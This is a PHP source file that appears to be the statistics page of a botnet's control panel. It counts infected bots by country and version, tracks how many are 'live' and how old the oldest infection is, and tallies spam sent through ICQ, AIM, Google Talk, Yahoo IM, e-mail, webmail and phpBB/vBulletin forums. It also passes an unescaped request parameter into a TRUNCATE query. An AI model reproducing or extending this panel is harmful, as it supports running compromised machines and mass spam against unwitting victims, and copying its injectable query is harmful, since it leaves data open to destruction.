<?
set_magic_quotes_runtime(1);
error_reporting(0);

include_once('auth.php');

require('mycommon.php');
include_once('lang.php');
include_once('html.php');




$ttt=microtime();
$ttt=((double)strstr($ttt, ' ')+(double)substr($ttt,0,strpos($ttt,' ')));


$mres = mysql_connect($BOT_DBHOST,$BOT_DBLOGIN,$BOT_DBPASS) or die('Check MySQl Options.'.mysql_error());
mysql_select_db($BOT_DBNAME);


require('getsoft.php');

/*
echo top_countries(12);
echo top_countries_today(12);
echo top_bot_version(12);
echo top_countries_report(11);
echo sumarize();*/

if(isset($_GET['clearglob'])){
	empty_table($_GET['clearglob'],$mres);
	header("Location: getglobal.php");
};


if(isset($_GET['allcountries']))
$MATCH_COUNTRIES=225;

$TOP_STATS = array(
"TOP_COUNTRIES"=>top_countries($MATCH_COUNTRIES),
"TOP_COUNTRIES_TODAY"=>top_countries_today($MATCH),
"TOP_BOT_VERSION"=>top_bot_version($MATCH),
"TOP_COUNTRIES_REPORT"=>top_countries_report($MATCH),
"TOP_SUMARIZE"=>sumarize(),
"LAND_SOFTSTAT"=>'IT',
"ZU_STATS"=>zupacha_protocols_tbl(),
"ZU_STATS_WEB"=>zupacha_web_protocols()
);


 $_SESSION['TOP_LAND_LIST'] = list_top_countries($MATCH_COUNTRIES);



$STAT=1;
include_once('head.php');


HTML_HEADER("Bot traffic&nbsp;");

TBL_DETAIL($TOP_STATS);

HTML_FOOTER();


zupacha_protocols_tbl();


//include_once('bottom.php');
//Funtions**************


function empty_table($tbl,$mres){
	$q = "TRUNCATE `".$tbl."`";
	mysql_query($q,$mres);
	return  mysql_affected_rows($mres);
};



function list_top_countries($count){
	global $BOT_DBTBL,$_SESSION;	
	
   if($count<>0)
	$lmt = ' limit '.$count;

	$q ='SELECT `cnt`,`Flang` FROM (SELECT COUNT(`Flang`) as `cnt`,`Flang` FROM `'.$BOT_DBTBL.'`  Group BY Flang ASC) as `bots` order by `cnt` DESC '.$lmt.';';
	$result =  mysql_query($q);

	if(!$result)die('No resource'.mysql_error());
	 $R_ARR = array();
	 
  while (@$row = mysql_fetch_object($result)){
  	
   	$R_ARR[]= $row->Flang;  	  	
  };
  
  return $R_ARR;	
	
};





function top_countries($count){
	global $BOT_DBTBL;

	if($count<>0)
	$lmt = ' limit '.$count;

	$q ='SELECT `cnt`,`Flang` FROM (SELECT COUNT(`Flang`) as `cnt`,`Flang` FROM `'.$BOT_DBTBL.'`  Group BY Flang ASC) as `bots` order by `cnt` DESC '.$lmt.';';
	$result =  mysql_query($q);

	if(!$result)die('No resource'.mysql_error());

	$num=mysql_num_rows(mysql_query('SELECT `Flang` FROM `'.$BOT_DBTBL.'` GROUP BY `Flang`;'));

	$row = mysql_fetch_object(mysql_query('SELECT COUNT(`Flang`) as `cnt` FROM `'.$BOT_DBTBL.'`;'));
	$nag= $row->cnt;

	return gen_tbl($result,$nag,true,$num,'Country','Rating','Totally','prim_s');
};

//-----------------------------------------

function top_countries_today($count){
	global $BOT_DBTBL;

	if($count<>0)
	$lmt = ' limit '.$count;

	$today = '['.date('d',time(0)).'/'.date('m',time(0)).'/'.date('y',time(0)).']';
	//echo $today;

	$q ='SELECT `cnt`,`Flang` FROM (SELECT COUNT(`Flang`) as `cnt`,`Flang` FROM `'.$BOT_DBTBL.'`  WHERE `FFirstRep` like ("'.$today.'%")  Group BY Flang ASC) as `bots` order by `cnt` DESC '.$lmt.';';
	$result =  mysql_query($q);

	if(!$result)die('No resource'.mysql_error());

	$num=mysql_num_rows(mysql_query('SELECT `Flang` FROM `'.$BOT_DBTBL.'`  WHERE `FFirstRep` like ("'.$today.'%") ;'));

	return gen_tbl($result,$num,true,'','Country','Rating','totaly','bhead');

};

//-----------------------------------------

function top_bot_version($count){
	global $BOT_DBTBL;

	if($count<>0)
	$lmt = ' limit '.$count;


	$q ='SELECT `FVer` as Flang, `cnt` FROM(SELECT `FVer`,COUNT(`FVer`) as `cnt`
FROM `'.$BOT_DBTBL.'`  GROUP BY `FVer`) as `bver` ORDER BY `cnt` DESC '.$lmt.';';
	$result =  mysql_query($q);

	if(!$result)die('No resource'.mysql_error());

	$r = mysql_query('SELECT SUM(`cnt`) as `sum` FROM (SELECT `FVer`,COUNT(`FVer`) as `cnt` FROM `'.$BOT_DBTBL.'`  GROUP BY `FVer`) as `bots` ;');
	$row= mysql_fetch_object($r);
	$num = $row->sum;

	$r = mysql_query('SELECT COUNT(`cnt`) as `cnt` FROM (SELECT `FVer`,COUNT(`FVer`) as `cnt` FROM `'.$BOT_DBTBL.'`  GROUP BY `FVer`) as `bots` ;');
	$row= mysql_fetch_object($r);
	$nag = $row->cnt;


	return gen_tbl($result,$num,false,$nag,'Bot version','Rating','Totally','bhead');

};


//-----------------------------------------

function top_countries_report($count){
	global $BOT_DBTBL;

	if($count<>0)
	$lmt = ' limit '.$count;

	$q ='SELECT `Flang`,`cnt` FROM (SELECT SUM(`cnt`) as `cnt`,Flang  FROM  (SELECT `FRepCnt` as `cnt`,`Flang`  FROM `'.$BOT_DBTBL.'`) as `bots` GROUP BY Flang) as `bots` ORDER BY `cnt` DESC '.$lmt.';';
	$result =  mysql_query($q);

	if(!$result)die('No resource'.mysql_error());

	$r = mysql_query('SELECT SUM(`FRepCnt`) as `sum` FROM `'.$BOT_DBTBL.'` ;');
	$row= mysql_fetch_object($r);
	$num = $row->sum;


	return gen_tbl($result,$num,true,'','Country','Rating','Totally bot`s reports','bhead');
}

//-----------------------------------------


function sumarize(){
	global $BOT_DBTBL;

	$q = 'SELECT COUNT(`Fidx`) as `cnt` FROM `'.$BOT_DBTBL.'`;';
	$r=mysql_query($q);
	$row= mysql_fetch_object($r);
	$BOT_CNT = $row->cnt;

	$q = 'SELECT SUM(`FRepCnt`) as `sum` FROM `'.$BOT_DBTBL.'` ;';
	$r=mysql_query($q);
	$row= mysql_fetch_object($r);
	$BOT_REP = $row->sum;

	$q = 'SELECT COUNT(`cnt`) as `cnt` FROM (SELECT `FFirstRepInt` as `cnt` FROM `'.$BOT_DBTBL.'` WHERE `FFirstRepInt` between '.(time(0)-96400).' and '.time(0).') as `bots`;';
	$r=mysql_query($q);
	$row= mysql_fetch_object($r);
	$BOT_NEW_TODAY = $row->cnt;


	$q='SELECT COUNT(`cnt`) as `cnt` FROM (SELECT `FFirstRepInt` as `cnt` FROM `'.$BOT_DBTBL.'` WHERE `FFirstRep` like ("'.date('[d/m/y]',time(0)).'%")) as `bots`;';
	$r=mysql_query($q);
	$row= mysql_fetch_object($r);
	$BOT_NEW_THIS_DAY = $row->cnt;



	$q = 'SELECT COUNT(`cnt`) as `cnt` FROM (SELECT `FLastRepInt` as `cnt` FROM `'.$BOT_DBTBL.'` WHERE `FLastRepInt` between '.(time(0)-86400).' and '.time(0).') as `bots`;';
	$r=mysql_query($q);
	$row= mysql_fetch_object($r);
	$BOT_REP_TODAY = $row->cnt;

	$q = 'SELECT MIN(`FFirstRepInt`) as `cnt` FROM `'.$BOT_DBTBL.'`;';
	$r=mysql_query($q);
	$row= mysql_fetch_object($r);
	$BOT_DAY_CNT = $row->cnt;
	if($BOT_DAY_CNT!=''){
		$BOT_DAY_CNT = time(0) - $BOT_DAY_CNT;
		$BOT_DAY_CNT=@round($BOT_DAY_CNT/86400);
	}else $BOT_DAY_CNT=0;

	// $tmp = time(0)-(86400);
	//echo date('d.m.y',$tmp).'<br>';
	// $tmp = time(0)-$tmp;
	//echo  round($tmp/86400);

	$BOT_ALIVE = @round(($BOT_REP_TODAY/$BOT_CNT)*100);

	if($BOT_ALIVE <= 25)
	$BOT_ALIVE = '<font color=red><b>'.$BOT_ALIVE.'%<b></font>';
	else if ($BOT_ALIVE >= 80)
	$BOT_ALIVE = '<font color=#00CC00><b>'.$BOT_ALIVE.'%<b></font>';
	else $BOT_ALIVE = '<b>'.$BOT_ALIVE.'%<b>';



	$sum_arr = array(
	"BOT_CNT"=>$BOT_CNT,
	"BOT_REP"=>$BOT_REP,
	"BOT_NEW_TODAY"=>$BOT_NEW_TODAY,
	"BOT_REP_TODAY"=>$BOT_REP_TODAY,
	"BOT_DAY_CNT"=>$BOT_DAY_CNT,
	"BOT_ALIVE"=>$BOT_ALIVE,
	"BOT_NEW_THIS_DAY"=>$BOT_NEW_THIS_DAY
	);


	return sum_tbl($sum_arr);
}





//-----------------------------------------

function sum_tbl($arr){

	return  '<table width="95%" border="0" align="center" cellpadding="1" cellspacing="1" class="cntbox">'.
	'<tr>'.
	'<td colspan="4"><div align="center">Sumarize</div></td>'.
	'</tr>'.
	'<tr>'.
	'<td width="23%">Bot`s count:<b>'.$arr["BOT_CNT"].'</b></td>'.
	'<td width="26%">Today new bots:<b>'.$arr["BOT_NEW_TODAY"].'</b><br><a title="Sumarize Bot`s count by day of month  (New bot`s for '.date('[d/m/y]',time(0)).' - '.$arr["BOT_NEW_THIS_DAY"].')  ">All New bot today</a>:<b>'.$arr["BOT_NEW_THIS_DAY"].'</b></td>'.
	'<td width="26%">Today Bot reports:<b>'.$arr["BOT_REP_TODAY"].'</b> </td>'.
	'<td width="25%">&nbsp;</td>'.
	'</tr>'.
	'<tr>'.
	'<td>&nbsp;</td>'.
	'<td>Percent Live bot`s:&nbsp;'.$arr["BOT_ALIVE"].'</td>'.
	'<td>Bot reports:<b>'.$arr["BOT_REP"].'</b> </td>'.
	'<td>Oldest bot has: <b>'.$arr["BOT_DAY_CNT"].'</b> days </td>'.
	'</tr>'.
	'</table>';


}

//-----------------------------------------

function gen_tbl($mysql_result,$totally,$islang,$nag,$title1,$title2,$bottom,$style){
	global $LNG;

	if($style=='')
	$style='prim_s';


	$tbl='<table width="100%" border="0" class="'.$style.'">'.
	'<tr>'.
	'<td>&nbsp;</td>'.
	'<td width="42%"><b>'.$title1.'</b></td>'.
	'<td colspan="2"><b>'.$title2.'</b></td>'.
	'</tr>';

	$result = $mysql_result;

	$num_results=mysql_num_rows($result);
	for($i=0;$i<$num_results;$i++){
		$row= mysql_fetch_object($result);

		$tbl=$tbl.'<tr>'.
		'<td width="14"><img src="img/stat_img/'.($islang ? 'ext_'.strtolower($row->Flang).'.png' : 'app.gif' ).'" with=14 height=14 border=0></td>'.
		'<td width="62%">'.($islang ? @$LNG[strtolower($row->Flang)] : $row->Flang).'</td>'.
		'<td width="17%">'.$row->cnt.'</td>'.
		'<td width="11%">'.intval(@round(($row->cnt/$totally)*100)).'%</td>'.
		'</tr>';

	};//intval(round(($row['num_votes']/$total_votes)*100));


	$tbl = $tbl.'<tr>'.
	'<td>&nbsp;</td>'.
	'<td colspan="3">'.$bottom.': <strong>'.($nag!=''? $nag :($islang ? $totally : $nag)).'</strong></td>'.
	'</tr>'.
	'</table>';
	return $tbl;


};


//-----------------------------------------



function get_zu_protocol_sum($protocol){
global $mres;	
	
$q = "SELECT sum(`".$protocol."`) as sum FROM `task_zu` ";
$result = @mysql_query($q,$mres);

if(!mysql_num_rows($result))
 return 0;
 
$r = mysql_fetch_object($result);

	//$ret = '';

	//eval("\$ret = \$r->".$field.";");
	return $r->sum;

};



function  zupacha_sum_cnt($R_arr){
$cnt =0;
foreach ($R_arr as $k=>$v)
 $cnt += get_zu_protocol_sum('T'.$k.'_done');
	
 return $cnt;
};



function zupacha_protocols_tbl(){
global $mres,$R_WEB_MAIL,$R_WEB_FORUM;

$pro= array(
'Mirabilis ICQ'=>get_zu_protocol_sum('Ticq_done'),
'Aol AIM'=>get_zu_protocol_sum('Taim_done'),
'Google Talk'=>get_zu_protocol_sum('Tgoogle_done'),
'Yahoo! IM'=>get_zu_protocol_sum('Tyahoo_done'),
'E-Mail'=>get_zu_protocol_sum('Tmail_done'),
'Spam-bots mail'=>get_zu_protocol_sum('Tsbots_done'),
'Web mail'=>zupacha_sum_cnt($R_WEB_MAIL),
'Web forum'=>zupacha_sum_cnt($R_WEB_FORUM));

$ico = array(
'Spam-bots mail'=>'spambots_ok2.gif',
'Mirabilis ICQ'=>'icq_ok.gif',
'Aol AIM'=>'aim_ok.gif',
'Google Talk'=>'gtalk_ok.gif',
'Yahoo! IM'=>'yahoo_ok.gif',
'E-Mail'=>'mail_ok.gif',
'Web mail'=>'webmail_ok3.gif',
'Web forum'=>'webforum_ok3.gif'
);
//sort($pro);

asort($pro);
$pro = array_reverse($pro);
$cnt =0;
foreach ($pro as $key=>$val){
$cnt +=$val;	
};


	$tbl ="<table width=\"150\" border=\"0\" cellpadding=\"1\" cellspacing=\"2\" > "."\n"
." <tr> "."\n"
." <td>&nbsp;</td> "."\n"
." <td width=\"61%\"><b>Protocol</b></td> "."\n"
." <td colspan=\"2\" nowrap=\"nowrap\"><b>Sent Msg</b></td> "."\n"
." </tr> "."\n";

foreach ($pro as $im=>$val){	

$tbl  .= " <tr> "."\n"
." <td width=\"11%\"><img src=\"img/".$ico[$im]."\"  border=0></td> "."\n"
." <td width=\"61%\" nowrap=\"nowrap\">".$im."</td> "."\n"
." <td width=\"10%\">".$val."</td> "."\n"
." <td width=\"10%\">".intval(@round(($val/$cnt)*100))."%</td> "."\n"
." </tr> "."\n";
};
	

$tbl .=" <tr> "."\n"
." <td>&nbsp;</td> "."\n"
." <td colspan=\"3\">Tottaly Sent : <strong>".number_format($cnt)."</strong></td> "."\n"
." </tr> "."\n"
."</table></td> "."\n";

return  $tbl;

};










function  zupacha_web_protocols(){
global $R_WEB_MAIL,$R_WEB_FORUM,$mres;

$M_P = array();

 foreach ($R_WEB_MAIL as $k=>$v){
 	$M_P[$k] = 	get_zu_protocol_sum('T'.$k.'_done');
 };


asort($M_P);
$M_P = array_reverse($M_P);
$cnt =0;
foreach ($M_P as $key=>$val){
$cnt +=$val;	
}; 
	


	$tbl ="<table width=\"150\" border=\"0\" cellpadding=\"1\" cellspacing=\"2\" > "."\n"
." <tr> "."\n"
." <td>&nbsp;</td> "."\n"
." <td width=\"61%\" nowrap=\"nowrap\"><b>Service name</b></td> "."\n"
." <td colspan=\"2\" nowrap=\"nowrap\"><b>Sent Msg</b></td> "."\n"
." </tr> "."\n";

foreach ($M_P as $key=>$val){	

	 $fn = $key;
	if(@!file_exists("img/stat_img/".$key.".jpg"))
	 $fn = 'bmunk';
	
$tbl  .= " <tr> "."\n"
." <td width=\"11%\"><img src=\"img/stat_img/".$fn.".jpg\" border=0></td> "."\n"
." <td width=\"61%\" nowrap=\"nowrap\"><a href=\"http://".$R_WEB_MAIL[$key]."\" target=_blank>".$R_WEB_MAIL[$key]."</a></td> "."\n"
." <td width=\"10%\">".$val."</td> "."\n"
." <td width=\"10%\">".intval(@round(($val/$cnt)*100))."%</td> "."\n"
." </tr> "."\n";
};
	

$tbl .=" <tr> "."\n"
." <td>&nbsp;</td> "."\n"
." <td colspan=\"3\">Web mail Sent : <strong>".$cnt."</strong></td> "."\n"
." </tr> "."\n"
."</table> <br>"."\n";




$F_P = array();

 foreach ($R_WEB_FORUM as $k=>$v){
 	$F_P[$k] = 	get_zu_protocol_sum('T'.$k.'_done');
 };


asort($F_P);
$F_P = array_reverse($F_P);
$cnt =0;
foreach ($F_P as $key=>$val){
$cnt +=$val;	
}; 
	

$tbl .="<table width=\"90%\" border=\"0\" align=\"center\" cellpadding=\"0\" bordercolor=\"#CCCCCC\" bgcolor=\"#FFFFFF\"> "."\n"
." <tr> "."\n"
." <td width=\"17%\" ><img src=\"img/stat_img/bb.jpg\" alt=\"Web Forum phpbb\"></td> "."\n"
." <td width=\"83%\" nowrap=\"nowrap\" ><div align=\"center\" class=\"percbar1\">phpBB</div></td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td colspan=\"2\" nowrap=\"nowrap\">Topic reply:".$F_P['bbrpl']."</td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td colspan=\"2\">New topic messages:".$F_P['bbnew']."</td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td width=\"17%\" ><img src=\"img/stat_img/vb.jpg\" alt=\"Web Forum VBulletin\"></td> "."\n"
." <td width=\"83%\" nowrap=\"nowrap\" ><div align=\"center\" class=\"percbar1\">VBulletin</div></td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td colspan=\"2\"><table width=\"100%\" height=\"8\" cellpadding=\"0\" cellspacing=\"0\"> "."\n"
." <tr> "."\n"
." <td width=\"40%\" >Topic reply:".$F_P['vbrpl']."</td> "."\n"
." </tr> "."\n"
." </table></td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td colspan=\"2\">New topic messages:".$F_P['vbnew']."</td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td colspan=\"2\" nowrap=\"nowrap\">Forum messages totally: <strong>".$cnt."</strong></td> "."\n"
." </tr> "."\n"
." </table>";



return  $tbl;
	
};




















$ddd=microtime();
$ddd=((double)strstr($ddd, ' ')+(double)substr($ddd,0,strpos($ddd,' ')));
echo ("<br><center>"
."<p><a href=\"getglobal.php?clearglob=$BOT_DBTBL\" title=\"Empty fields\">Clear global</a>&nbsp;Statistics.</p>"
."<p>(Time generating stats:".(number_format(($ddd-$ttt),2))." seconds)</p><center><br>");

?>